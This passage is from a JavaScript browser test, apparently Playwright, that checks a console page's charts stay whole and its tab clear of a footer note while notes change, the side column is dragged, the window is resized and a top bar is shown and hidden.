      for (const k of await shownKeys(page)) assertWhole(await stageRead(page, stageOfCard(k)), what + ', ' + key + ' shown, the chart ' + k);
      const f = await footTab(page);
      assert.ok(f.tab.b <= f.foot.t + 1, what + ': the tab runs under the note: ' + JSON.stringify([f.tab, f.foot]));
    }
  };
  const seen = [];
  await sayLong(page);
  seen.push(['note said', (await footTab(page)).foot.h]);
  await whole('a long note said');
  await clearNote(page);
  seen.push(['note cleared', (await footTab(page)).foot.h]);
  await whole('the note cleared');
  for (const dx of [220, -320]) {
    const side = await midOf(page, '[data-split="side"]');
    await drag(page, side, { x: side.x + dx, y: side.y }, 10);
    seen.push(['side ' + dx, await page.$eval('.console__side', (s) => s.offsetWidth)]);
    await whole('the side column sized by ' + dx + ' px');
  }
  for (const [w, h] of [[1100, 640], [1700, 980], [1366, 768]]) {
    await page.setViewportSize({ width: w, height: h });
    await whole('the window at ' + w + ' x ' + h);
  }
  await pick(page, 'goals');
  await sleep(300);
  const rest = await barOver(page);
  await page.mouse.move(683, 300);
  await page.mouse.move(683, 3, { steps: 10 });
  await page.waitForFunction(() => document.body.classList.contains('console-bar-shown'), null, { timeout: 3000 });
  const shown = await barOver(page);
  await page.mouse.move(683, 500, { steps: 6 });
  await page.waitForFunction(() => !document.body.classList.contains('console-bar-shown'), null, { timeout: 3000 });
  await sleep(400);
  const gone = await barOver(page);
  seen.push(['bar', rest.picture, shown.picture, gone.picture]);
  assert.deepEqual([shown.picture, gone.picture, shown.tab, gone.tab], [rest.picture, rest.picture, rest.tab, rest.tab], 'the bar showing or going moved the chart or the tab');
  await whole('the bar shown and gone');
  console.log('     ' + JSON.stringify(seen));
  assert.deepEqual(errors, []);
  await context.close();
});

await browser.close();
console.log('\n' + results.join('\n'));
if (results.some((r) => r.startsWith('FAIL'))) process.exit(1);
